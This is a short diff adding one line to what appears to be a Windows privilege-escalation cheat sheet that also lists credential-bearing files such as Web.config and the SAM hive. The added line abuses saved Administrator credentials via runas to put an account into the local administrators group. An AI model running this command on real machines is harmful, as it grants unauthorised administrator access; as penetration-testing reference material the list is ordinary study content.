@@ -145,6 +145,8 @@ C:\inetpub\wwwroot\Web.config
 %windir%\system32\config\SAM (only really useful if you have access to the files while the machine is off)
 
 
+runas /user:Administrator /savecred /noprofile "CMD /C net localgroup administrators security /add"
+
 
 
 
